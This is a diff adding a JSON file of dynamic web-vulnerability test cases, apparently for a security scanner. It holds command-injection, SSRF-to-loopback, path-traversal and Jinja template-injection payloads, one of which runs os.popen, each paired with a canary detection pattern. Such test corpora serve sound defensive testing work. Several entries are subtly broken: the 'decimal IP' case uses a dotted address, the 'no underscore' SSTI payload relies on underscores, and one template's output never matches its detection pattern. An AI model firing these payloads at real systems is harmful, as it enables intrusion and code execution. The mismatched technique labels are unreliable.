@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1<id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Process substitution with < redirect to bypass control char filter"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\tid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Tab character (\\t) bypass for newline filter"
+  },
+  {
+    "id": "dyn_ssrf_1",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "Decimal IP notation to bypass host allowlist"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://[::1]:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "IPv6 loopback to bypass IPv4 host filter"
+  },
+  {
+    "id": "dyn_path_1",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//tmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "Double-dot bypass with slash insertion to evade .. substring check"
+  },
+  {
+    "id": "dyn_ssti_1",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('echo CANARY_SSTI_2b6d4e').read()}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Sandbox escape via __class__ chain without underscore prefix in template"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{% set x = 'ssti_canary' %}{{x}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Variable assignment to access ssti_canary context variable"
+  }
+]
